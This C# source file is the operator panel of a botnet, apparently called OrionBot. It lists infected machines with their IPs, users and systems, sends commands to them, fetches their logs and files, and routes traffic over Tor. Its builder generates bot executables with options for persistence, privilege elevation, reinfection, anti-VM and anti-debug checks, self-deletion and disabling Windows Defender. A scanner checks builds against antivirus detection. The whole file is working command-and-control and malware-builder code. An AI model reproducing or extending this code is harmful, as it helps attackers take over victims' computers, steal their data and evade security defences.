using Bunifu.Framework.UI;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Panel
{

    public partial class Form1 : Form
    {

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("Builder\\Builder.dll",
            CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern bool Build(string Input, string Output, string Icon, bool UseTor);
        [DllImport("Builder\\Builder.dll",
            CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern void CreateConfig();
        [DllImport("Builder\\Builder.dll",
            CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        public static extern void WriteConfig(string Section, string Key, string Value);


        Thread Worker;
        public CWebClient Client = new CWebClient();
        public CWebClient Client2 = new CWebClient();
        private Image[] StatusImgs;
        public bool sys = true;

        public static void RunTor()
        {
            Process tor = new Process();
            tor.StartInfo.FileName = "Tor\\tor.exe";
            tor.StartInfo.Arguments = "--HTTPTunnelPort 7979";
            tor.StartInfo.CreateNoWindow = true;
            tor.Start();
        }

        public int BotIndex(ArrayList a, string id)
        {
            for (int i = 0; i < a.Count; i++)
            {
                if (((Dictionary<string, string>)a[i])["id"] == id)
                    return i;
            }
            return -1;
        }

        public bool IsOnline(string time)
        {
            long x = Int64.Parse(time);
            double t = x / 1000;
            DateTime a = new DateTime(1970, 1, 1, 0, 0, 0).AddSeconds(t);
            TimeSpan b = DateTime.UtcNow.Subtract(a);
            return (b.TotalMinutes < 3);
        }

        public byte NetworkAvailability(int t, int o)
        {
            double x = (double)o / t;
            double p, a = Math.Abs(0.5 - x), g = 1 - x;
            p = Math.Min(x, Math.Min(a, g));
            if (p == g) return 2;
            if (p == a) return 1;
            return 0;
        }

        public string GetCurrentTabName()
        {
            string a = "";
            Invoke((MethodInvoker)delegate
            {
                a = PageControl.SelectedTab.Name;
            });
            return a;
        }

        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
            dtDateTime = dtDateTime.AddMilliseconds(unixTimeStamp).ToLocalTime();
            return dtDateTime;
        }

        public struct ServerData
        {
            public ArrayList Bots;
            public Dictionary<string, uint> Stats;
        }

        public ServerData ParseXml(string s, ref int t, ref int o)
        {
            ServerData a = new ServerData
            {
                Bots = new ArrayList(),
                Stats = new Dictionary<string, uint>()
            };
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(s);
            //Parse bots
            XmlNode bots = xml.DocumentElement.SelectSingleNode("bots");
            foreach (XmlNode bot in bots)
            {
                t++;
                bool iso = IsOnline(bot.SelectSingleNode("last").InnerText);
                if (iso) o++;
                string id = bot.SelectSingleNode("id").InnerText;
                Dictionary<string, string> newBot = new Dictionary<string, string>
                    {
                        { "id", bot.SelectSingleNode("id").InnerText },
                        { "name", bot.SelectSingleNode("name").InnerText },
                        { "ip", bot.SelectSingleNode("ip").InnerText }
                    };
                XmlNode sys = bot.SelectSingleNode("system");
                newBot["comp"] = sys.SelectSingleNode("name").InnerText + " @ " + sys.SelectSingleNode("user").InnerText;
                sys = sys.SelectSingleNode("os");
                newBot["sys"] = sys.SelectSingleNode("name").InnerText + " " + sys.SelectSingleNode("bit").InnerText;
                newBot["last"] = iso.ToString();
                a.Bots.Add(newBot);
            }
            //Parse statistics
            XmlNode stats = xml.DocumentElement.SelectSingleNode("stats");
            a.Stats["uptime"] = uint.Parse(stats.SelectSingleNode("uptime").InnerText);
            a.Stats["users"] = uint.Parse(stats.SelectSingleNode("users").InnerText);
            foreach (XmlNode p in stats.SelectSingleNode("active").ChildNodes)
            {
                a.Stats.Add(p.SelectSingleNode("time").InnerText, uint.Parse(p.SelectSingleNode("count").InnerText));
            }
            return a;
        }

        public ArrayList ParseFiles(string s)
        {
            ArrayList a = new ArrayList();
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(s);
            XmlNodeList files = xml.DocumentElement.SelectNodes("file");
            foreach (XmlNode file in files)
            {
                DateTime d = UnixTimeStampToDateTime(double.Parse(file.SelectSingleNode("date").InnerText));
                string[] p = { file.SelectSingleNode("name").InnerText, d.ToString("MM/dd/yyyy HH:mm:ss") };
                a.Add(p);
            }
            return a;
        }

        public void UpdateData()
        {
            Client.Headers.Add("User-Agent", "OrionBot");
            while (true)
            {
                try
                {
                    string tabName = GetCurrentTabName();
                    if (tabName == "Page3")
                    {
                        string s = Client.DownloadString(Properties.Settings.Default.GateLocation + "files");
                        ArrayList a = ParseFiles(s);
                        Invoke((MethodInvoker)delegate
                        {
                            int i = (fileView.SelectedItems.Count == 1) ? fileView.SelectedIndices[0] : -1;
                            fileView.Items.Clear();
                            foreach (string[] v in a)
                            {
                                fileView.Items.Add(new ListViewItem(v));
                            }
                            if ((fileView.Items.Count > i) && (i > -1)) fileView.Items[i].Selected = true;
                        });
                    }
                    else
                    {
                        string s = Client.DownloadString(Properties.Settings.Default.GateLocation + "bots");
                        sys = true;
                        int t = 0, o = 0; //Total, Online
                        ServerData Data = ParseXml(s, ref t, ref o);
                        Invoke((MethodInvoker)delegate
                        {
                            for (int j = 0; j < botGrid.Rows.Count; j++)
                            {
                                DataGridViewRow row = botGrid.Rows[j];
                                int i = BotIndex(Data.Bots, row.Cells["idCol"].Value.ToString());
                                if (i > -1)
                                {
                                    var bot = (Dictionary<string, string>)Data.Bots[i];
                                    bool r = row.Cells["ipCol"].Value.ToString() != bot["ip"];
                                    r = r || row.Cells["statusCol"].Value != StatusImgs[Boolean.Parse(bot["last"]) ? 0 : 1];

                                    if (r)
                                    {
                                        row.Cells["statusCol"].Value = StatusImgs[Boolean.Parse(bot["last"]) ? 0 : 1];
                                        row.Cells["ipCol"].Value = bot["ip"];
                                    }

                                    Data.Bots.RemoveAt(i);
                                }
                                else
                                {
                                    botGrid.Rows.RemoveAt(j);
                                    j--;
                                }
                            }
                            foreach (Dictionary<string, string> bot in Data.Bots)
                            {
                                int i = botGrid.Rows.Add();
                                DataGridViewRow row = botGrid.Rows[i];
                                row.Cells["statusCol"].Value = StatusImgs[Boolean.Parse(bot["last"]) ? 0 : 1];
                                row.Cells["idCol"].Value = bot["id"];
                                row.Cells["nameCol"].Value = bot["name"];
                                row.Cells["ipCol"].Value = bot["ip"];
                                row.Cells["compCol"].Value = bot["comp"];
                                row.Cells["sysCol"].Value = bot["sys"];
                            }
                            if (Data.Bots.Count != 0)
                            {
                                Notification Noti;
                                if (Data.Bots.Count == 1)
                                {
                                    var bot = (Dictionary<string, string>)Data.Bots[0];
                                    Noti = new Notification("New bot",
                                        "Name: " + bot["name"] + "\n" +
                                        "Computer: " + bot["comp"] + "\n" +
                                        "System: " + bot["sys"]);
                                }
                                else
                                    Noti = new Notification("New bots", Data.Bots.Count.ToString() + " new bots have been discovered.");
                                Noti.Show();
                            }
                            botsLabel.Text = "Number of bots:      " + t.ToString();
                            onlineLabel.Text = o.ToString();
                            offlineLabel.Text = (t - o).ToString();
                            uptimeLabel.Text = "Server uptime:         " + TimeSpan.FromMilliseconds(Data.Stats["uptime"]).ToString("%h'h '%m'm '%s's'");
                            usersLabel.Text = "Number of users:    " + Data.Stats["users"];
                            systemProgressBar.MaxValue = Math.Max(1, t);
                            systemProgressBar.Value = o;
                            systemProgressBar.LabelVisible = true;
                            int x = NetworkAvailability(t, o);
                            networkLabel.Text = "Network availability\n";
                            switch (x)
                            {
                                case 0:
                                    networkLabel.Text += "Poor";
                                    networkLabel.ForeColor = Color.FromArgb(255, 60, 0);
                                    break;
                                case 1:
                                    networkLabel.Text += "Average";
                                    networkLabel.ForeColor = Color.FromArgb(255, 132, 0);
                                    break;
                                default:
                                    networkLabel.Text += "Great";
                                    networkLabel.ForeColor = Color.FromArgb(77, 230, 0);
                                    break;
                            }
                            x = activityChart.Series[0].Points.Count;
                            bool refresh = true;//(x < 6);
                            if (refresh)
                            {
                                activityChart.Series[0].Points.Clear();
                                x = 0;
                                foreach (KeyValuePair<string, uint> k in Data.Stats)
                                {
                                    if (x < 2)
                                    {
                                        x++;
                                        continue;
                                    }
                                    DateTime np = new DateTime(1970, 1, 1).AddMilliseconds(double.Parse(k.Key)).ToLocalTime();
                                    activityChart.Series[0].Points.AddXY(np, k.Value);
                                }
                            }
                            updateLabel.Text = DateTime.Now.ToString("dd/MM/yyy HH:mm:ss");
                        });
                    }
                }
                catch (WebException e) when (e.Response is HttpWebResponse res)
                {
                    switch (res.StatusCode)
                    {
                        case HttpStatusCode.Unauthorized:
                            MessageBox.Show("Your session has expired.");
                            Invoke((MethodInvoker)delegate { Application.Restart(); });
                            break;
                    }
                }
                catch (WebException)
                {
                    sys = false;
                }
                Invoke((MethodInvoker)delegate
                {
                    systemLabel.Text = sys ? "All systems operational" : "Systems down";
                    systemLabel.ForeColor = sys ? Color.FromArgb(77, 230, 0) : Color.FromArgb(255, 60, 0);
                });
                Thread.Sleep(Properties.Settings.Default.UpdateInterval * 1000);
            }
        }

        public void LoadSettings()
        {
            gateTextBox.Text = Properties.Settings.Default.GateLocation;
            intervalSlider.Value = Properties.Settings.Default.UpdateInterval;
            miningTextBox.Text = Properties.Settings.Default.MiningStats;
            prefixTextBox.Text = Properties.Settings.Default.Prefix;
            RITextBox.Text = Properties.Settings.Default.RIPayload;
            apiTextBox.Text = Properties.Settings.Default.APIKey;
            torCheck1.Checked = Properties.Settings.Default.Tor;
        }

        public void SaveSettings()
        {
            Properties.Settings.Default.GateLocation = gateTextBox.Text;
            Properties.Settings.Default.UpdateInterval = (ushort)intervalSlider.Value;
            Properties.Settings.Default.MiningStats = miningTextBox.Text;
            Properties.Settings.Default.Prefix = prefixTextBox.Text;
            Properties.Settings.Default.RIPayload = RITextBox.Text;
            Properties.Settings.Default.APIKey = apiTextBox.Text;
            Properties.Settings.Default.Tor = torCheck1.Checked;
            Properties.Settings.Default.Save();
        }

        public void FixButtonIcon(object sender, EventArgs e)
        {
            ((BunifuFlatButton)sender).IconZoom = 50;
            ((BunifuFlatButton)sender).IconVisible = true;
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            Client.Dispose();
            Close();
        }

        private void MinimizeButton_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            LoadSettings();
            fileNameEdit.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Bot.exe";
            fileNameEdit2.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Bot.exe";
            StatusImgs = new Image[] { Properties.Resources.Online, Properties.Resources.Offline };
            Worker = new Thread(UpdateData);
            Worker.Start();
            Client2.UploadValuesCompleted += (_sender, _e) =>
            {
                if (_e.Error is WebException)
                {
                    MessageBox.Show("Failed to add command: " + _e.Error.Message);
                }
                else
                {
                    MessageBox.Show(System.Text.Encoding.UTF8.GetString(_e.Result));
                }
            };
        }

        private void SomeMenu_Click(object sender, EventArgs e)
        {
            String s = ((Control)sender).Name;
            s = s.Remove(0, 4);
            PageControl.SelectedIndex = Int32.Parse(s) - 1;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Worker.Abort();
        }

        private void SaveButton_Click(object sender, EventArgs e)
        {
            SaveSettings();
        }

        private void CmdItem_Click(object sender, EventArgs e)
        {
            string ItemName = ((ToolStripMenuItem)sender).Name;
            using (CmdForm cForm = new CmdForm(Commands.Get[ItemName]))
            {
                if (cForm.ShowDialog() == DialogResult.OK)
                {
                    ArrayList Targets = CheckedRows();
                    //Send request
                    var Params = new NameValueCollection
                    {
                        { "bots", JsonConvert.SerializeObject(Targets) },
                        { "command", ItemName.Substring(3) },
                        { "params", JsonConvert.SerializeObject(cForm.Values) }
                    };
                    Uri u = new Uri(Properties.Settings.Default.GateLocation + "newcmd");
                    Client2.UploadValuesAsync(u, "POST", Params);
                }
            }
        }

        private void BotGrid_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.RowIndex < 0) return;
            if (e.Button == MouseButtons.Right)
            {
                botGrid.EndEdit();
                if (NoRowsAreChecked())
                {
                    botGrid.Rows[e.RowIndex].Cells["checkCol"].Value = "1";
                }
            }
        }

        private ArrayList CheckedRows()
        {
            ArrayList a = new ArrayList();
            for (int i = 0; i < botGrid.RowCount; i++)
            {
                if (botGrid.Rows[i].Cells["checkCol"].Value != null)
                {
                    if (botGrid.Rows[i].Cells["checkCol"].Value.ToString() == "1")
                    {
                        a.Add(botGrid.Rows[i].Cells["idCol"].Value.ToString());
                    }
                }
            }
            return a;
        }

        private bool NoRowsAreChecked()
        {
            return (CheckedRows().Count == 0);
        }

        private void MiningLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(Properties.Settings.Default.MiningStats);
        }

        private void LogDropdown_VisibleChanged(object sender, EventArgs e)
        {
            logDropdown.Clear();
            logBox.Text = "Please select a bot first.";
            foreach (DataGridViewRow row in botGrid.Rows)
            {
                logDropdown.AddItem(row.Cells["nameCol"].Value.ToString());
            }
        }

        private void LogDropdown_onItemSelected(object sender, EventArgs e)
        {
            logBox.Text = "Fetching log for " + logDropdown.selectedValue + "...";
            int I = -1;
            for (int i = 0; i < botGrid.RowCount; i++)
            {
                if (botGrid.Rows[i].Cells["nameCol"].Value.ToString() == logDropdown.selectedValue)
                {
                    I = i;
                    break;
                }
            }
            if (I == -1)
            {
                logBox.Text = "This bot has been uninstalled.";
                return;
            }
            try
            {
                string s = Client2.DownloadString(Properties.Settings.Default.GateLocation + "logs?BotID=" +
                           botGrid.Rows[I].Cells["idCol"].Value.ToString());
                XmlDocument xml = new XmlDocument();
                xml.LoadXml(s);
                XmlNodeList msgs = xml.DocumentElement.SelectNodes("msg");
                logBox.Text = "";
                foreach (XmlNode msg in msgs)
                {
                    if (msg.Attributes.Count != 1) break;
                    string x = msg.Attributes["id"].InnerText;
                    x = x.Substring(x.Length - 4);
                    x = "[." + x + "] " + msg.InnerText;
                    x = x.Replace("\n", "\n\t");
                    logBox.Text += x + "\r\n";
                }
            }
            catch (WebException _e) when (_e.Response is HttpWebResponse)
            {
                logBox.Text = "Error while fetching log: " + _e.Message;
            }

        }

        private void RefreshButton_Click(object sender, EventArgs e)
        {
            if (logDropdown.selectedIndex > -1)
                LogDropdown_onItemSelected(sender, e);
        }

        private void BrowseButton_Click(object sender, EventArgs e)
        {
            if (saveAsDialog.ShowDialog() == DialogResult.OK)
            {
                fileNameEdit.Text = saveAsDialog.FileName;
            }
        }

        private void StartupCheck_OnChange(object sender, EventArgs e)
        {
            bool a = startupCheck.Checked;
            autoStRadio.Enabled = a;
            taskStRadio.Enabled = a;
            regStRadio.Enabled = a;
            folderStRadio.Enabled = a;
        }

        private void AddIconToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (openIconDialog.ShowDialog() == DialogResult.OK)
            {
                iconBox.BackgroundImage = Image.FromFile(openIconDialog.FileName);
            }
        }

        private void RemoveIconToolStripMenuItem_Click(object sender, EventArgs e)
        {
            iconBox.BackgroundImage = Panel.Properties.Resources.Executable;
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (PageControl.SelectedTab.Name == "Page2")
            {
                if (e.Control)
                {
                    botGrid.EndEdit();
                    if (e.KeyCode == Keys.A)
                    {
                        for (int i = 0; i < botGrid.RowCount; i++)
                        {
                            botGrid.Rows[i].Cells["checkCol"].Value = "1";
                        }
                    }
                    else
                    if (e.KeyCode == Keys.D)
                    {
                        for (int i = 0; i < botGrid.RowCount; i++)
                        {
                            botGrid.Rows[i].Cells["checkCol"].Value = "0";
                        }
                    }
                }
            }
        }

        private void AddConfigValues()
        {
            WriteConfig("Server", "Gate", Properties.Settings.Default.GateLocation);
            WriteConfig("Install", "ExeName", innerEdit.Text);
            WriteConfig("Install", "Prefix", Properties.Settings.Default.Prefix);
            WriteConfig("Install", "BaseName", baseNameEdit.Text);
            WriteConfig("Install", "BaseLocation", baseLocDropdown.selectedIndex.ToString());
            WriteConfig("Install", "Owner", Properties.Settings.Default.Username);
            WriteConfig("Install", "RIPayload", Properties.Settings.Default.RIPayload);
            WriteConfig("Install", "Method", vectorEdit.Text);
            WriteConfig("Install", "Startup", startupCheck.Checked ? (autoStRadio.Checked ? "1" : (taskStRadio.Checked ? "2" : (regStRadio.Checked ? "3" : "4"))) : "0");
            WriteConfig("Server", "Tor", torCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Hide", hideCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Elevate", elevateCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Persistence", persistenceCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Reinfect", reinfectCheck.Checked ? "1" : "0");
            WriteConfig("Install", "AntiV", antiVirtCheck.Checked ? "1" : "0");
            WriteConfig("Install", "AntiD", antiDebugCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Sleep", sleepCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Melt", meltCheck.Checked ? "1" : "0");
            WriteConfig("Install", "Windef", windefCheck.Checked ? "1" : "0");
        }

        private bool CheckValues()
        {
            if (baseLocDropdown.selectedIndex > 3)
                if (!elevateCheck.Checked)
                {
                    MessageBox.Show("This base location requires administrative privileges.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }
            if (windefCheck.Checked)
                if (!elevateCheck.Checked)
                {
                    MessageBox.Show("Disabling Windows Defender requires administrative privileges.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return false;
                }
            if (!Directory.Exists(Path.GetDirectoryName(fileNameEdit.Text)))
            {
                MessageBox.Show("The output directory doesn't exist.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            if (innerEdit.Text.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
            {
                MessageBox.Show("The internal name is invalid.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            if ((string.IsNullOrWhiteSpace(innerEdit.Text)) || (string.IsNullOrWhiteSpace(fileNameEdit.Text)))
            {
                MessageBox.Show("File names cannot be empty.", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
            return true;
        }

        private void BuildButton_Click(object sender, EventArgs e)
        {
            if (!CheckValues()) return;
            buildProgressBar.Value = 0;
            CreateConfig();
            buildProgressBar.Value = 10;
            AddConfigValues();
            buildProgressBar.Value = 50;
            Client2.DownloadFile(Properties.Settings.Default.GateLocation + "build.bin", "Builder\\build.bin");
            WriteConfig("Install", "Version", FileVersionInfo.GetVersionInfo("Builder\\build.bin").FileVersion);
            buildProgressBar.Value = 80;
            if (Build("Builder\\build.bin", fileNameEdit.Text, openIconDialog.FileName, torCheck.Checked))
            {
                buildProgressBar.Value = 100;
                MessageBox.Show("Build successful.");
            }
        }

        private void ScanButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(fileNameEdit2.Text))
            {
                MessageBox.Show("The specified file does not exist.", "Scanner", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (Properties.Settings.Default.APIKey == "")
            {
                MessageBox.Show("You need to set your API Key first.", "Scanner", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            resultBox.BackgroundImage = null;
            progressLabel.Visible = true;
            Process p = new Process();
            p.StartInfo.FileName = "scan.exe";
            p.StartInfo.Arguments = Properties.Settings.Default.APIKey + " -f \"" + fileNameEdit2.Text + "\" -img";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.EnableRaisingEvents = true;
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory() + "\\Scanner";
            p.Exited += new EventHandler(ScanExit);
            p.Start();
        }

        private void ScanExit(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)delegate
            {
                progressLabel.Visible = false;
                resultBox.BackgroundImage = new Bitmap("Scanner\\" + Path.GetFileNameWithoutExtension(fileNameEdit2.Text) + ".png");
            });
        }

        private void BrowseButton2_Click(object sender, EventArgs e)
        {
            if (scanDialog.ShowDialog() == DialogResult.OK)
            {
                fileNameEdit2.Text = scanDialog.FileName;
            }
        }

        private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Client2.DownloadFile(Properties.Settings.Default.GateLocation + fileView.SelectedItems[0].Text,
                    "Files\\" + fileView.SelectedItems[0].Text);
                MessageBox.Show("Download complete.");
            }
            catch (Exception _e)
            {
                MessageBox.Show("Download failed: " + _e.Message, "Files", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UploadHereToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (uploadDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    Client.UploadFile(Properties.Settings.Default.GateLocation + "upload", uploadDialog.FileName);
                    MessageBox.Show("Upload complete.");
                }
                catch (Exception _e)
                {
                    MessageBox.Show("Upload failed: " + _e.Message, "Files", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void ClearButton_Click(object sender, EventArgs e)
        {
            if (logDropdown.selectedIndex > -1)
            {
                int I = -1;
                for (int i = 0; i < botGrid.RowCount; i++)
                {
                    if (botGrid.Rows[i].Cells["nameCol"].Value.ToString() == logDropdown.selectedValue)
                    {
                        I = i;
                        break;
                    }
                }
                Client2.UploadValues(Properties.Settings.Default.GateLocation + "clear",
                    new NameValueCollection()
                    {
                        { "id", botGrid.Rows[I].Cells["idCol"].Value.ToString() }
                    });
                MessageBox.Show("Logs cleared!");
                LogDropdown_onItemSelected(sender, e);
            }
        }

        private void ResetButton_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Reset();
            LoadSettings();
            MessageBox.Show("Done!");
        }

        private void DeleteStripMenuItem1_Click(object sender, EventArgs e)
        {
            Client2.UploadValues(Properties.Settings.Default.GateLocation + "delete",
                    new NameValueCollection()
                    {
                        { "file", fileView.SelectedItems[0].Text }
                    });
            MessageBox.Show("Deleted.");
        }

        private void TorButton_Click(object sender, EventArgs e)
        {
            try
            {
                RunTor();
            }
            catch (Exception _e)
            {
                MessageBox.Show("Failed to start Tor: " + _e.Message);
            }
        }
    }
}
